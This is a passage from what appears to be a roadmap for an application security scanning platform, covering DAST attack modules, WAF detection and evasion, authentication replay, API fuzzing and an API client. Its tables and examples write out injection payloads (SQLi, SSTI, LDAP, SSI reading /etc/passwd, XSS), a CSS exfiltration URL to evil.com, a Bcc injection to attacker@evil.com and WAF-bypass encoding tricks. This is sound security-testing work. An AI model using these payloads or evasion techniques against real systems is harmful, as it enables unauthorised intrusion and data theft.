  - License taxonomy: permissive (MIT, Apache-2.0, BSD, ISC), copyleft (GPL-2.0, GPL-3.0, AGPL-3.0, LGPL), restricted (BUSL, SSPL, Elastic License), unknown
  - Policy engine: "Block AGPL-3.0 in proprietary projects", "Allow GPL-2.0 only in internal tools", "Flag all 'unknown' licenses for legal review"
  - License compatibility matrix: "You have MIT (compatible) + GPL-3.0 (compatible) + AGPL-3.0 (INCOMPATIBLE — blocks release)"
  - License change detection: "Library X changed from MIT → BUSL between v2.3 and v2.4"
- **Malware & Packaging Integrity:**
  - Detect: npm install scripts, post-install hooks, pre-build scripts in dependencies
  - Detect: typosquatting (edit distance), dependency confusion, protestware, crypto miners in deps
  - Detect: packages that exfiltrate data (HTTP calls to unknown hosts in install scripts)
  - Detect: packages that drop binaries, modify system files, access env vars unnecessarily
  - Feed from: OSV.dev, GitHub Advisory Database, npm advisory, PyPI advisory, Sonatype OSS Index
- **Provenance Attestation:**
  - For each package: "Who published it? Was it 2FA-authenticated? Is the repo archived? When was last commit?"
  - Maintainer reputation scoring: frequency of releases, responsiveness to CVEs, community size
  - "This package has 1 maintainer, last release 3 years ago, 47 open issues → HIGH RISK"

**Success Criteria:**
```
SBOM: `appsec sbom generate ./my-project` → CycloneDX 1.5 + SPDX 2.3 → 247 components identified
SBOM diff: v1.2.3 → v1.2.4 → 2 added (fast-xml-parser@4.5.0, zod@3.24.0), 1 upgraded (lodash)
VEX: CVE-2024-XXXX → status: not_affected → "Vulnerable function processData() in libfoo v1.2 
      is not called from any code path in our application. See call graph analysis attached."
License: "3 AGPL-3.0 packages detected — build blocked per org policy"
       "Library moment@2.29.4: license changed from MIT → BUSL (blocked) — find alternative"
Supply chain: "Package colors@1.4.0: maintainer abandoned, repo archived, 
              protestware incident 2022 — flag for replacement"
SLSA: "Your build pipeline: SLSA L2 → 3 steps to reach L3"
```

---

### Milestone 5k: Deep API & Protocol Security Scanning ✅
**Deliverables:**
- **gRPC Scanning:**
  - Parse `.proto` files → extract service definitions, RPC methods, message schemas
  - gRPC reflection: discover services and methods at runtime via reflection API
  - Generate and fuzz: Protocol Buffer messages with boundary/malformed/oversized payloads
  - Auth testing: test gRPC methods without metadata/auth → detect unauthenticated endpoints
  - TLS testing: validate mTLS configuration, certificate pinning
  - Detect: gRPC-specific injection (protobuf injection), streaming abuse (infinite stream), large message DoS
- **GraphQL Deep Security:**
  - Introspection query → rebuild full schema (types, queries, mutations, subscriptions, directives)
  - Detect: introspection enabled in production, field suggestions leaking schema
  - Attack: depth overflow (query depth 100+), alias batching (DoS via query batching), circular fragment DoS
  - Auth: test queries/mutations without auth header → detect unauthenticated access
  - Authorization: test if user A can access user B's data via GraphQL queries (IDOR)
  - Rate limiting: test if query cost analysis is enforced (expensive queries blocked?)
  - Subscription testing: WebSocket-based subscription authentication
  - Inject: SQLi/NoSQLi through GraphQL arguments, SSRF through custom scalar types
- **WebSocket Security Scanning:**
  - Connection: establish WS/WSS connection, handle cookies/auth headers
  - Frame injection: send malformed frames (oversized, fragmented, masked incorrectly)
  - CSWSH (Cross-Site WebSocket Hijacking): test Origin header validation
  - Auth: connect without token → should be rejected
  - Message fuzzing: send malformed JSON, oversized text, binary data
  - Reconnection abuse: rapid connect/disconnect → test for resource exhaustion
  - Protocol downgrade: try to downgrade WSS → WS
- **SOAP/XML Web Services:**
  - WSDL parsing: extract operations, message types, endpoints
  - XXE injection in SOAP envelopes
  - XPath injection in SOAP parameters
  - WS-Security header manipulation
  - Billion laughs attack via SOAP body
  - Recursive entity expansion in XML payloads
- **API Version Inconsistency Detection:**
  - Discover: `/api/v1/users`, `/api/v2/users`, `/api/v3/users` → test all versions
  - "v1 has auth → v2 is missing auth" → flag as regression
  - Test deprecated endpoints for lingering access
- **Golden Source Rule Feeds for API Security:**
  - **OWASP API Security Top 10** — full rule set for all 10 categories
  - **GraphQL Threat Matrix** (`nicholasalee/graphql-threat-matrix`) — attack catalog
  - **31k+ API schemas** from APIs.guru OpenAPI Directory for benchmarking

**Success Criteria:**
```
gRPC scan: user.UserService reflected → 4 RPCs discovered → GetUser lacks auth → Critical
GraphQL: Introspection enabled → 142 types, 34 queries, 12 mutations → GetUsers allows 
         user ID enumeration (query 1000 sequential IDs) → 998 records returned → IDOR
WebSocket: Connect to wss://app/ws → Send malformed frame (masked incorrectly) → Server
           crashes with 500 → DoS confirmed
API versions: /api/v2/users has auth, /api/v1/users (deprecated) has NO auth → Flag
```

---

### Milestone 6: DAST Engine — Dynamic Analysis Scanner (Core) ✅
**Status:** Complete — Requires expansion (see M6a–M6g below)
**Deliverables:**
- Crawler with common path discovery (static wordlist-based, 40+ common paths)
- 10 attack modules: SQLi, XSS, SSRF, CMDi, Path Traversal, XXE, CSRF, Headers, CORS, JWT
- HTTP request/response engine with TLS support
- Response analysis: pattern detection, anomaly scoring
- Attack vector generation: wraps payloads into query params, body, path, headers
- Queue-based execution via BullMQ with progress reporting

**What's Missing (covered by M6a–M6g):**
- ❌ Browser-based crawling (JavaScript/SPA rendering)
- ❌ Authentication replay & session management
- ❌ 30+ additional attack modules (see M6c)
- ❌ WAF detection & payload evasion
- ❌ Passive/proxy scanning mode
- ❌ Screenshot evidence capture
- ❌ Compliance scanning (PCI DSS, OWASP ASVS)
- ❌ Scan scoping & throttling

**Success Criteria:**
```
Queue DAST scan → Worker picks up → Crawls target → Sends attack payloads
→ Finds reflected XSS → Stores finding in DB → Dashboard shows finding
```

---

### Milestone 6a: Browser-Based Crawler & SPA Engine ✅
**Deliverables:**
- **Headless Chromium Integration:**
  - Launch browser via `browserless/chrome` or local Puppeteer
  - Wait for JS frameworks to render (React, Vue, Angular, Svelte)
  - Intercept XHR/fetch/WebSocket traffic during crawl
  - Extract API endpoints from inlined JS bundles (`/api/v1/...`, `/graphql`)
  - Capture dynamically injected DOM elements and event handlers
- **SPA Crawl Strategies:**
  - Click all `<a>`, `<button>`, `<input type="submit">` elements
  - Fill and submit all `<form>` elements with test data
  - Scroll to trigger lazy-loaded content (infinite scroll)
  - Traverse client-side router links (`router-link`, `[routerLink]`, `Link`)
  - Detect and interact with shadow DOM
- **Link Discovery:**
  - Parse `robots.txt` → extract allowed/disallowed paths
  - Parse `sitemap.xml` → extract all URLs (including nested sitemap indexes)
  - Extract URLs from `<script>`, `<link>`, `<meta>`, `<iframe>`, `<object>`, `<embed>`
  - Discover `.well-known/` endpoints (security.txt, openid-configuration, assetlinks.json)
  - Detect technology stack (Wappalyzer-style fingerprinting) to guide crawl
- **Crawl Configuration:**
  - Max depth, max pages, max time limits
  - Exclusion patterns (logout URLs, delete actions, password reset)
  - Scope control: same domain, subdomain allowlist, path prefix
  - Request throttling (delay between requests, concurrent connection limit)
  - Custom User-Agent and header injection
  - Proxy support (HTTP/HTTPS/SOCKS5)

**Success Criteria:**
```
Crawl React SPA with 50 pages → Browser renders JS → 50 pages + 12 API endpoints discovered
Crawl with robots.txt → 3 disallowed paths logged (not scanned, but noted)
Crawl with sitemap.xml → 200 URLs extracted from nested sitemaps
Crawl configuration: maxDepth=5, maxPages=500, exclude=/logout.* → obeys all constraints
```

---

### Milestone 6b: Authentication Replay & Session Management ✅
**Deliverables:**
- **Login Sequence Recorder (Macro Recorder):**
  - Record multi-step auth flows: login page → enter creds → submit → MFA → redirect
  - Support: form-based, HTTP Basic/Digest, NTLM, OAuth 2.0 (Authorization Code, PKCE), OIDC, JWT bearer, API key, mTLS, SAML assertion
  - Save recorded macros as reusable auth profiles per project
  - Replay macros before scan and periodically during scan to refresh session
- **Session State Management:**
  - Cookie jar: capture, store, replay cookies from auth flow across all scan requests
  - Session validation: probe a protected endpoint before/during scan; if 401/403 → re-authenticate
  - Token refresh: for JWT/OAuth, detect expiry → call refresh endpoint → update auth header
  - Concurrent session support: test with multiple user roles simultaneously
- **MFA Handling:**
  - TOTP: user provides seed → scan auto-generates codes
  - Push notification: pause scan → notify user to approve → resume
  - Backup codes: user provides list → scan cycles through them
  - SMS/Email: integration with MailHog (dev) or Twilio/SendGrid (prod) for code capture
- **Logout Detection & Recovery:**
  - Detect logout by response content (redirect to /login, 302 to auth provider)
  - Detect session termination by HTTP status (401 on previously-authenticated endpoint)
  - Auto-re-authenticate and resume scan from where it left off

**Success Criteria:**
```
Record login macro: /login → POST creds → 302 → /dashboard → extract JWT
Replay before scan → Session valid (200 on /api/me)
Mid-scan session expired → Auto-detected → Re-authenticated → Scan resumed
OAuth 2.0 PKCE flow: /authorize → /callback → extract access_token → use in scan
MFA with TOTP: provided seed → codes generated → auth flow completes
```

---

### Milestone 6c: Advanced DAST Attack Modules ✅
**Deliverables — 35+ attack categories beyond the core 10:**

| # | Attack Module | CWE | Method | Payload Strategy |
|---|--------------|-----|--------|------------------|
| 1 | **HTTP Request Smuggling** | CWE-444 | TE.CL / CL.TE desync | Ambiguous Content-Length + Transfer-Encoding |
| 2 | **Web Cache Poisoning** | CWE-644 | Header injection | X-Forwarded-Host, X-Forwarded-Scheme, unkeyed headers |
| 3 | **Host Header Injection** | CWE-748 | Host override | X-Forwarded-Host, Host override, absolute URI |
| 4 | **Server-Side Template Injection (SSTI)** | CWE-94 | Template syntax | `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>` |
| 5 | **LDAP Injection** | CWE-90 | Query injection | `*)(uid=*))(|(uid=*`, `*)(|(password=*` |
| 6 | **XPath Injection** | CWE-643 | XPath query | `' or '1'='1`, `' or true() or '` |
| 7 | **HTTP Parameter Pollution (HPP)** | CWE-235 | Duplicate params | `?id=1&id=2` — test which value wins |
| 8 | **CRLF / Header Injection** | CWE-113 | Response splitting | `%0d%0aSet-Cookie: injected=true` in URL/body |
| 9 | **Email Header Injection** | CWE-93 | Mail header | `%0d%0aBcc: attacker@evil.com` in contact forms |
| 10 | **Subdomain Takeover** | CWE-N/A | DNS dangling | Check CNAMEs for unclaimed cloud resources |
| 11 | **NoSQL Injection** | CWE-943 | MongoDB query | `{"$gt":""}`, `{"$ne":null}`, `{"$where":"sleep(5000)"}` |
| 12 | **GraphQL Attacks** | CWE-N/A | Introspection | Introspection query, field suggestions, batching attacks, alias-based DDoS, depth overflow |
| 13 | **WebSocket Attacks** | CWE-345 | WS frame injection | Cross-site WebSocket hijacking (CSWSH), malformed frames, oversized frames |
| 14 | **Race Condition Testing** | CWE-362 | Parallel requests | Send N concurrent requests, test TOCTOU (coupon codes, voting, limits) |
| 15 | **Brute Force Detection** | CWE-307 | Rate limit test | Progressive request rate → detect lockout threshold |
| 16 | **Session Fixation** | CWE-384 | Cookie check | Does session cookie change after login? |
| 17 | **Insecure Cookie Attributes** | CWE-614 | Cookie audit | Missing Secure, HttpOnly, SameSite; persistent cookies |
| 18 | **Clickjacking** | CWE-1021 | Frame check | Test X-Frame-Options, CSP frame-ancestors |
| 19 | **CORS Misconfiguration** | CWE-942 | Origin spoof | Reflect `Origin`, `null` origin, `*.attacker.com` subdomain |
| 20 | **Sensitive Data Exposure** | CWE-200 | Response audit | Scan responses for PII, tokens, keys, internal IPs, stack traces |
| 21 | **Error Message Information Leak** | CWE-209 | Error probe | Trigger 4xx/5xx → check for stack traces, SQL errors, debug info |
| 22 | **HTTP Method Override / Verb Tampering** | CWE-650 | Method fuzz | `X-HTTP-Method-Override: PUT`, try DELETE on GET-only endpoints |
| 23 | **Content-Type Mismatch** | CWE-436 | Content-Type fuzz | Send XML as JSON, send multipart with wrong boundary |
| 24 | **Unvalidated Redirects** | CWE-601 | Redirect follow | `?redirect=https://evil.com`, `?next=//evil.com`, `?returnUrl=javascript:alert(1)` |
| 25 | **File Upload Testing** | CWE-434 | Upload fuzz | Double extension (.php.jpg), MIME mismatch, oversized, null-byte, SVG XSS |
| 26 | **XML Injection / XSLT Injection** | CWE-91 | XML payload | Entity expansion (billion laughs), XInclude, XSLT code execution |
| 27 | **SSI Injection** | CWE-N/A | Server-side includes | `<!--#exec cmd="ls"-->`, `<!--#include virtual="/etc/passwd"-->` |
| 28 | **Prototype Pollution (client-side)** | CWE-1321 | JSON merge | `{"__proto__":{"isAdmin":true}}`, `{"constructor":{"prototype":{"isAdmin":true}}}` |
| 29 | **DOM-Based XSS** | CWE-79 | DOM taint | Source→Sink tracking via DOM inspection (postMessage, location.hash, document.URL) |
| 30 | **CSS Injection** | CWE-99 | Style inject | `<style>body{background:url(https://evil.com/?exfil=)}` |
| 31 | **OpenAPI/Swagger Exposure** | CWE-N/A | Discovery | Check for `/swagger.json`, `/openapi.json`, `/api-docs` without auth |
| 32 | **Debug Endpoint Discovery** | CWE-489 | Path fuzz | Check `/actuator`, `/debug`, `/trace`, `/heapdump`, `/env`, `.env`, `phpinfo.php` |
| 33 | **Default Credentials** | CWE-1392 | Credential test | Test common defaults: admin/admin, root/root, guest/guest, tomcat/tomcat |
| 34 | **Weak TLS/Cipher** | CWE-326 | TLS scan | Test supported ciphers, TLS versions, certificate validity, HSTS preload |
| 35 | **Content Security Policy Analysis** | CWE-1021 | CSP audit | Parse CSP → check for unsafe-inline, unsafe-eval, wildcard sources, report-only mode |

**Success Criteria:**
```
Full DAST scan with all 35 modules enabled → Each module generates attack vectors →
Findings returned with: attack ID, CWE, CVSS, evidence, reproduction steps
HTTP Smuggling: TE.CL desync detected → Finding: CWE-444, CVSS 9.8
GraphQL introspection: Schema exposed → 142 fields discovered → 5 mutations without auth
Web Cache Poisoning: X-Forwarded-Host reflected in cached response → CWE-644
Race condition: 10 concurrent coupon redemptions → 8 succeeded (only 1 should) → CWE-362
```

---

### Milestone 6d: WAF Detection, Evasion & Payload Encoding ✅
**Deliverables:**
- **WAF Fingerprinting:**
  - Send probe requests with benign payloads → analyze response headers (`X-CDN`, `Server`, `X-Served-By`)
  - Detect: Cloudflare, AWS WAF, Azure WAF, Akamai, Imperva, F5, ModSecurity, NAXSI
  - Detect WAF mode: blocking (403 on attack) vs. monitoring (200 with logging)
  - Adjust scan strategy based on WAF presence
- **Payload Encoding & Evasion (15+ techniques):**
  - URL encoding: single `%27`, double `%2527`, triple `%252527`
  - Unicode normalization: `%C0%AE%C0%AE%C0%AF` (overlong UTF-8)
  - HTML entity encoding: `&#39;`, `&#x27;`, `&apos;`
  - Base64 encoding: `Jw==` → `'`
  - Case variation: `<ScRiPt>`, `SeLeCt`, `UnIoN`
  - Whitespace tricks: `/**/`, `%09`, `%0a`, `%0d`, `%0b`, `%0c`
  - Comment injection: `/**/OR/**/1=1`, `SEL/**/ECT`
  - Null byte injection: `%00`, `\x00`, `\0`
  - String concatenation: `' + 'a' + 'dmin`, `CONCAT('ad','min')`
  - Alternate syntax: `SELECT` → `SELSELECTECT`, backtick escapes
  - Token chunking: split payload across multiple headers/params
  - HTTP parameter fragmentation: `?p1=<scr&p2=ipt>` (if app reassembles)
  - Encoded slashes: `..%2F..%2F`, `..%252F..%252F`
  - JavaScript escapes: `\x27`, `'`, `\x{27}`
  - Nesting: URL-encode → Base64 → URL-encode again
- **Evasion Result Tracking:**
  - For each payload, try plain → URL-encoded → double-encoded → Unicode → case-varied
  - Track which evasion technique bypassed the WAF (if any)
  - Report: "SQLi detected only with double URL-encoding — WAF bypassed"
- **Rate Limit Detection & Adaptive Throttling:**
  - Start scan at 10 req/s → detect 429 responses → auto-throttle to 5 → 2 → 1 req/s
  - Respect `Retry-After` headers
  - Detect IP-based vs. session-based rate limiting
  - Log rate limit thresholds for future scans

**Success Criteria:**
```
Target behind Cloudflare WAF → Detected → Payloads auto-encoded
Plain XSS payload blocked (403) → Double URL-encoded bypasses (200 + reflected)
Adaptive throttling: 429 at 10 req/s → Auto-adjusted to 3 req/s → Scan completes
Evasion report: "5 findings found only with encoding: 3 double-URL, 2 case-varied"
```

---

### Milestone 6e: Passive Scanning & Proxy Mode ✅
**Deliverables:**
- **Passive Scan Mode:**
  - Analyze HTTP traffic without sending attack payloads (safe for production)
  - Detect from response analysis alone:
    - Missing security headers
    - Cookie flags (Secure, HttpOnly, SameSite)
    - Information disclosure (server version, internal IPs, debug info)
    - Technology fingerprinting (outdated jQuery, vulnerable Apache version)
    - Email addresses, API keys, tokens in responses
    - Weak TLS configuration (version, cipher suite)
  - Import traffic from: HAR files, Burp Suite state files, ZAP sessions, PCAP files
- **Proxy/Intercept Mode (Man-in-the-Middle):**
  - Start a local proxy (like Burp Suite) — user configures browser to route through it
  - Live traffic capture: record all requests/responses as user browses target app
  - Live passive scanning: flag findings in real-time as traffic flows
  - Request interception: pause, inspect, modify, forward (like Burp Repeater)
  - Scope control: only capture in-scope domains; ignore out-of-scope
  - Export captured traffic as: HAR, cURL, Postman collection, OpenAPI spec
- **Traffic Diffing:**
  - Record session A (normal user) → Record session B (admin user) → Diff responses
  - Find authorization gaps: content visible to user A that should require admin
  - Find IDOR candidates: change user ID in recorded request → replay → compare response

**Success Criteria:**
```
Passive mode: Browse target for 10 min → HAR captured → 8 findings (headers, cookies, info leaks)
Proxy mode: Start proxy on localhost:8085 → Configure browser → Browse → Live findings appear
Import HAR: Load 50MB HAR file → Parse 5,000 requests → 23 passive findings extracted
Traffic diff: User vs Admin session → 3 endpoints return admin-only data to user → IDOR found
```

---

### Milestone 6f: Evidence Capture & Reproduction ✅
**Deliverables:**
- **Screenshot Capture on Finding:**
  - Take full-page screenshot of the page where finding was detected
  - Highlight the affected element/DOM node in the screenshot
  - Capture before/after: baseline response vs. attack response
  - Store screenshots alongside findings in S3/GCS with retention policy
- **Full HTTP Archive:**
  - Record every request/response pair during scan
  - Store as HAR (HTTP Archive) — standard format importable into Chrome DevTools, Burp, ZAP
  - HAR-per-finding: isolate the exact request that triggered the vulnerability
- **cURL Reproduction Command:**
  - For every finding, auto-generate a `curl` command that reproduces the issue:
    ```bash
    curl -X POST 'https://target.com/api/users' \
      -H 'Content-Type: application/json' \
      -d '{"name":"<script>alert(1)</script>"}'
    ```
  - Include all headers, cookies, auth tokens (redacted if sensitive)
  - Developer copies, pastes, runs → sees the vulnerability reproduced
- **Proof-of-Concept (PoC) Script:**
  - For critical/high findings, generate a standalone reproduction script (Python/Node)
  - Script is self-contained, imports only stdlib, takes target URL as argument
  - Includes assertions: "Expected X in response, got Y → vulnerability confirmed"
- **Video Recording (optional):**
  - Record browser session during authenticated crawl + attack phase
  - Timestamp-synced to finding log → click a finding → jump to that moment in video

**Success Criteria:**
```
Each finding has: screenshot.png + request.har + reproduction.sh + poc.py
Developer runs: bash reproduction.sh → Same XSS reproduced → Confirms finding
Screenshot shows: vulnerable page with injected <script>alert(1)</script> highlighted in red
cURL command: Copy-paste → Terminal → Response contains alert(1) → Vulnerability verified
```

---

### Milestone 6g: DAST Compliance Scanning ✅
**Deliverables:**
- **PCI DSS v4.0 Scans (requirement 11.3.1):**
  - Pre-configured scan profile matching PCI external/internal scan requirements
  - PCI-specific finding classification and risk ranking
  - Attestation-ready report template (PCI ROC-compatible)
  - Approved Scanning Vendor (ASV)-style executive summary
- **OWASP ASVS v4.0 Automated Checks:**
  - Map each DAST attack module to ASVS requirements (V1–V14)
  - Generate ASVS coverage report: "We test 73 of 124 applicable ASVS L1 requirements automatically"
  - Flag gaps: "V2.10 (JWT validation) requires manual testing"
- **Custom Compliance Profiles:**
  - Define compliance policy: "Must pass: no critical SQLi, all security headers present, TLS ≥ 1.2"
  - Scan against policy → Pass/Fail report per policy rule
  - CI/CD gate integration: "Deploy blocked — PCI scan found 2 critical findings"
- **NIST SP 800-53 / FedRAMP mapping:**
  - Map findings to SI-10 (Input Validation), SC-8 (Transmission Confidentiality), SC-23 (Session Authenticity)
- **Compliance Trend Reports:**
  - Track compliance posture over time → "PCI compliance improved from 62% → 91% over 6 months"
  - Per-application compliance score

**Success Criteria:**
```
Run PCI DSS scan → 3 findings → Report: "1 critical (SQLi — blocks PCI compliance), 2 low"
ASVS L1 coverage: "83/124 requirements covered automatically — 66.9% automation rate"
Custom policy: "Must have HSTS + CSP + no critical findings" → Scan passes → Gate green
NIST mapping: Each finding auto-tagged with relevant SP 800-53 control
```

---

### Milestone 7: API Security Scanner & API Client ✅
**Status:** Complete
**Deliverables:**
- OpenAPI/Swagger/Postman import with endpoint discovery
- Parameter fuzzing: SQLi, XSS, NoSQLi, CMDi, Path Traversal, SSRF, Overflow, Unicode, XML, Boundary
- API risk scoring (0-100): weighted by auth, anomalies, sensitive params
- Built-in API client: collections, folders, history, method selector, body editor, response viewer

**Success Criteria:**
```
Import Swagger doc → Discover N endpoints → Fuzz parameters → Risk score returned
API Client: Enter URL + method → Send → Response displayed with status, timing, size
```

**⚠️ Gap Audit Note:** M7 provides a basic HTTP request sender. The API client needs script execution, assertions, data-driven testing, multi-protocol support, mock servers, and collection monitoring to match Postman/Insomnia. See M7a–M7e below.

---

### Milestone 7a: API Client — Script Engine, Assertions & Request Chaining ✅
**Deliverables:**
- **Pre-request Script Execution Engine:**
  - Sandboxed JavaScript runtime (Node.js `vm` module or isolated-v8) for executing pre-request scripts
  - Available APIs in sandbox:
    - `pm.variables.get("varName")` / `pm.variables.set("varName", value)` — read/write variables
    - `pm.environment.get("name")` / `pm.environment.set("name", value)` — environment variables
    - `pm.collectionVariables.get("name")` / `pm.collectionVariables.set("name", value)` — collection scope
    - `pm.request.headers.add({key: "X-Custom", value: "..."})` — modify request headers
    - `pm.request.url.host`, `pm.request.url.path`, `pm.request.url.query` — access URL parts
    - `pm.sendRequest(url, options, callback)` — make sub-requests (for auth token fetch, etc.)
    - `CryptoJS`, `atob`, `btoa`, `JSON.parse`, `JSON.stringify` — standard utilities
    - `moment` / `dayjs` — date manipulation for timestamp generation
    - `uuid` — generate unique IDs
  - Timeout: 30s per script execution → if exceeded, kill script, flag error
  - Error handling: script errors captured → shown in UI with line number + stack trace
- **Post-response Script / Test Execution Engine:**
  - Same sandboxed JavaScript runtime
  - Available assertion APIs:
    - `pm.test("test name", () => { ... })` — define a named test
    - `pm.response.to.have.status(200)` — status code assertion
    - `pm.response.to.have.header("Content-Type", "application/json")` — header assertion
    - `pm.response.to.have.body("exact string")` — exact body match
    - `pm.response.to.have.jsonBody("key", value)` — JSON path assertion
    - `pm.response.to.have.jsonSchema(schema)` — JSON Schema validation
    - `pm.expect(pm.response.code).to.be.oneOf([200, 201])` — chai-style assertions
    - `pm.response.to.have.responseTime.lessThan(500)` — timing assertion
    - `pm.response.to.have.cookie("session")` — cookie existence assertion
  - Response data extraction:
    - `pm.collectionVariables.set("userId", pm.response.json().id)` — extract from JSON response
    - `pm.collectionVariables.set("token", pm.response.headers.get("X-Auth-Token"))` — extract from header
    - `pm.collectionVariables.set("redirectUrl", pm.response.url.toString())` — extract redirect URL
  - Test results: pass/fail count, failure messages, execution time per test
- **Assertion Execution Engine (declarative, no-code):**
  ```json
  {
    "assertions": [
      {"type": "status", "operator": "equals", "value": "200"},
      {"type": "header", "operator": "contains", "target": "Content-Type", "value": "json"},
      {"type": "json_path", "operator": "exists", "target": "$.data.users[0].id"},
      {"type": "json_path", "operator": "equals", "target": "$.status", "value": "success"},
      {"type": "response_time", "operator": "lt", "value": "1000"},
      {"type": "schema", "operator": "matches", "target": "{\"type\": \"object\", ...}"},
      {"type": "body", "operator": "regex", "value": "\\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]{2,}\\b"}
    ]
  }
  ```
  - Each assertion type supports: equals, contains, exists, not_exists, regex, gt, lt, gte, lte
  - Execution: ordered, stop on first failure (configurable)
- **Request Chaining:**
  - Extract data from response N → use in request N+1
  - Visual chain builder: drag connector from response field to request field
  - Chain steps: Login → Get token → Get user list → Get first user details → Update user
  - Data pass-through: response.json().id → `{{userId}}` in next request URL/body/header
  - Chain break conditions: stop if status != 200, stop if response.json().users.length == 0
  - Chain execution: sequential (default) or parallel (where no data dependency)

**Success Criteria:**
```
Pre-request: Math.random() + Date.now() → unique request ID in header → sent with request
Post-response test: Status 200 → ✅ | JSON has '.users' array → ✅ | Response time < 500ms → ❌ (742ms)
Assertion (declarative): 5 defined → 4 pass, 1 fail → "JSON path $.data.users[0].email: expected string, got null"
Request chain: Login → extract token → Get users → extract first ID → Get user details → All 4 pass
Sandbox security: Script with `while(true){}` → killed after 30s timeout → error displayed
```

---

### Milestone 7b: API Client — Collection Runner, Data-Driven Testing & CLI ✅
**Deliverables:**
- **Collection Runner:**
  - Run all requests in a collection sequentially or in parallel
  - Folder-level execution: run one folder at a time
  - Execution order: as-arranged, or custom drag-and-drop ordering
  - Delay between requests: configurable 0ms–60s
  - Stop on failure: configurable — continue or halt collection on first failure
  - Results dashboard: total requests, passed, failed, skipped, total time
  - Per-request results: status, response time, test results, response size
  - Export results: JSON, HTML report, JUnit XML (for CI integration)
- **Data-Driven Testing (Iteration):**
  - Upload data file: CSV (header row → variable names) or JSON array
  - Iteration: run collection once per data row
  - Example CSV:
    ```csv
    username,password,expectedStatus
    admin,correctpass,200
    admin,wrongpass,401
    '',anything,400
    admin,' OR 1=1 --,403
    ```
  - 4 iterations → 4 collection runs → 4 sets of results
  - Variables from data file available as `{{username}}`, `{{password}}`, etc.
  - Iteration control: skip current iteration on failure, continue to next
- **CLI Collection Runner (`appsec run`):**
  ```bash
  # Run a collection
  appsec run collection my-collection.json --environment staging
  
  # With data file
  appsec run collection my-collection.json --data users.csv --iterations 10
  
  # Output formats
  appsec run collection my-collection.json --reporter json,html,junit
  
  # CI mode (exit code 1 on any failure)
  appsec run collection my-collection.json --ci --timeout 300000
  
  # Run specific folder
  appsec run collection my-collection.json --folder "User API Tests"
  
  # Run with tags
  appsec run collection my-collection.json --tags smoke,regression
  ```
  - Exit codes: 0 = all passed, 1 = failures, 2 = errors (network/timeout)
  - CI-friendly output: dot progress, summary line
  - Environment override: `--env-var BASE_URL=https://staging.example.com`
- **Scheduled Collection Monitoring:**
  - Schedule collection runs: every 5m, 15m, 1h, daily, custom cron
  - Alert on: any failure, response time > threshold, response body changed
  - Monitor dashboard: uptime %, response time trend, failure log
  - Integration: alert to Slack/email/webhook on monitor failure
- **Variable Scopes (Hierarchy Resolution):**
  - Resolution order: Local > Data > Environment > Collection > Global
  - Global variables: shared across all collections in a workspace
  - Collection variables: scoped to one collection
  - Environment variables: scoped to one environment (dev/staging/prod)
  - Data variables: from CSV/JSON file, scoped to current iteration
  - Local variables: set in pre-request script, scoped to current request
  - Variable editor UI: all scopes visible, edit-in-place, import/export

**Success Criteria:**
```
Collection runner: 50 API test collection → 48 passed, 2 failed → Run time: 23s
  → Exported: results.json (raw), report.html (human-readable), junit.xml (CI)
Data-driven: 100-row CSV → 100 iterations → 94 passed, 6 failed → "Row 7: 401 (expected 200)"
CLI: appsec run collection api-tests.json --ci → Exit 1 → "2 tests failed. See junit.xml"
Monitor: Scheduled every 5m → 3 consecutive failures → Slack alert → "API /health is down!"
Variables: {{base_url}} resolves to Environment value (overrides Collection default)
```

---

### Milestone 7c: Multi-Protocol Support (WebSocket, gRPC, GraphQL, SOAP) ✅
**Deliverables:**
- **WebSocket Client:**
  - Connect: `ws://` or `wss://` with headers, cookies, sub-protocols
  - Send: text, JSON, binary (hex or base64)
  - Receive: real-time message log with timestamps
  - Message history: all sent/received messages in session
  - Auto-reconnect: configurable retry with backoff
  - Ping/pong: automatic keepalive with interval config
  - Frame inspector: view raw WS frames (opcode, payload length, mask)
  - Export session: JSON log, HAR-style WS format
- **gRPC Client:**
  - Load `.proto` file(s) → parse services, RPC methods, message types
  - Server reflection support: discover services without proto file
  - Method invocation: unary, server-streaming, client-streaming, bidirectional
  - Message builder: fill in protobuf message fields with auto-complete
  - Metadata editor: add gRPC metadata (headers) for auth, tracing
  - TLS/mTLS: configure client certificates
  - Deadline/timeout: per-call deadline configuration
  - Response viewer: formatted protobuf → JSON display
  - Import: `.proto` file, `protoset` file, server reflection URL
- **GraphQL Client:**
  - Schema introspection → auto-complete fields, arguments, types
  - Query editor: syntax highlighting, bracket matching, error markers
  - Variable editor: separate pane for GraphQL variables (JSON)
  - Operation selection: pick from multiple operations in document
  - Subscription support: WebSocket-based GraphQL subscriptions (graphql-ws protocol)
  - History: saved queries with responses
  - Schema explorer: interactive type browser
  - Export: query as cURL, fetch(), code snippet
- **SOAP Client:**
  - Load WSDL URL → parse operations, messages, types
  - Request builder: auto-generate SOAP envelope from WSDL
  - SOAP action header auto-set
  - WS-Security: UsernameToken, X.509, SAML token profiles
  - SOAP 1.1 and 1.2 support
  - Attachment support: MTOM, SwA
  - Response viewer: formatted XML with syntax highlighting
- **HTTP/2 and HTTP/3 (QUIC) Support:**
  - Detect server support via ALPN
  - HTTP/2: multiplexed streams, server push, HPACK header compression
  - HTTP/3: QUIC transport, 0-RTT
  - Comparison view: "HTTP/1.1: 1.2s | HTTP/2: 380ms | HTTP/3: 210ms"

**Success Criteria:**
```
WebSocket: wss://echo.websocket.org → Send "hello" → Receive "hello" (35ms) → Session saved
gRPC: Load user.proto → UserService.GetUser(id: 123) → Response: {name: "Jane", ...} (12ms)
GraphQL: Introspect → 142 types → Write query { users { id name } } → Auto-complete after '{'
        → Subscription { userCreated { id } } → Receives events in real-time
SOAP: Load calculator.wsdl → Add operation → Fill in a=5, b=3 → Response: <AddResult>8</AddResult>
HTTP/2: Connect → ALPN h2 → 50 parallel requests → 3x faster than HTTP/1.1 sequential
```

---

### Milestone 7d: API Client — Mock Server, Code Generation & Documentation ✅
**Deliverables:**
- **Mock Server:**
  - Generate mock endpoints from collection examples
  - Per-request configuration: status code, response body, response headers, latency
  - Dynamic responses: use request body/params/headers in response via template variables
  - Example: `POST /api/users` with `{"name": "{{$randomFullName}}"}` → returns random name
  - Mock rules: match on method + path + headers + query params + body pattern
  - Multiple responses per endpoint: return different responses based on request matching
  - Simulated latency: random delay, fixed delay, or Gaussian distribution
  - Simulated errors: configurable % chance of 4xx/5xx responses
  - Mock server URL: `https://mock.appsec.local/organization/collection-slug`
